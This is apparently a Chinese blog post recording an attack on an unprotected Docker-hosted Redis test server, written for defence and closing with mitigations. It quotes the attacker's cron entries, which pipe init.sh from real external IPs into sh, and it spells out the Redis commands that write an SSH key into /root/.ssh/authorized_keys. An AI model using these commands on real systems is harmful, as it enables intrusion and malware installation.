# 通过 RDB 方式入侵，Redis 被攻击记录

## 1. 详情

发现 Redis 中突然多了几个 key

* backup1
* backup2
* backup3
* backup4

具体内容如下：

```sh
*/2 * * * * root cd1 -fsSL http://194.87.139.103:8080/cleanfda/init.sh | sh

*/3 * * * * root wget -q -O- http://194.87.139.103:8080/cleanfda/init.sh | sh


*/4 * * * * root curl -fsSL http://45.133.203.192/cleanfda/init.sh | sh

*/5 * * * * root wd1 -q -O- http://45.133.203.192/cleanfda/init.sh | sh
```

看起来都是去下载sh脚本的。



然后看了下 Redis 日志,一直再报错：

```text
 Failed opening the RDB file crontab (in server root dir /etc) for saving: Permission denied
```

大概是RDB的时候，保存时因为没有权限报错了。



然后看了下RDB相关配置：

```sh
spider:0>config get dir
 1)  "dir"
 2)  "/etc"
spider:0>config get dbfilename
 1)  "dbfilename"
 2)  "crontab"
```

好家伙，果然被改了，给改成了`/etc/crontab`。这不就是定时任务吗



然后再结合上多出来的几个 key 的内容，妥妥的被攻击了。

这RDB如果执行成功了，然后定时任务就算是被添加了，最终把脚本下载下来并执行，妥妥的矿机一个了。



好在是这个 Redis 是用 docker 跑的，权限问题，没有被得手。

因为是测试服务器，随便用 Docker 起了一个，也没设置密码，端口和IP绑定也没改，就差点中招。



被入侵成功的案例：

```sh
https://www.codenong.com/txiaoxiaoher-2511379/
```

网上找了下,还有通过 设置主从同步 的方式被入侵的 redis 的案例：

```sh
https://www.renfei.net/posts/1003500
```





## 2. 后记

其实本次最大的漏洞是在 docker 运行绑定端口的时候，绑定是的 0.0.0.0:6379。正确的应该绑定 127.0.0.1:6379。

首先，docker 在绑定端口的时候直接修改了防火墙，如果不指定IP，那么默认是 0.0.0.0:6379，docker 设置防火墙开放 0.0.0.0:6379，任何 IP 都可以访问 6379。但你如果设置 127.0.0.1:6379，那只有本机地址能访问 6379。所以造成了端口向外暴露。docker 会接管防火墙！

>  防火墙相关文档 https://www.cnblogs.com/qjfoidnh/p/11567309.html

其次，因为原本设计的 redis 是内部使用，并不对外公开，也就没有密码，直接裸奔，也造成了端口暴露以后在全互联网裸奔的情况。

最后，redis 是可以将内容保存到本地磁盘中的，这就造成了通过 redis 间接可以写入文件，例如：

redis 执行以下命令，将 ssh key 写入被害机器，注意首尾要加换行符

```sh
set jjj "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABA....\n\n"
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```

此时就将 ssh key 写入了 /root/.ssh/authorized_keys，就实现了免密登陆，黑客可以直接 ssh 进来了。同理还可以写入定时任务文件，让被害机器执行黑客的脚本。



**解决方案**

* 1）docker 开放端口的时候一定要指定 IP 地址
* 2）给 redis 增加密码验证

> 江湖凶险，即使是个测试服务器也不能掉以轻心

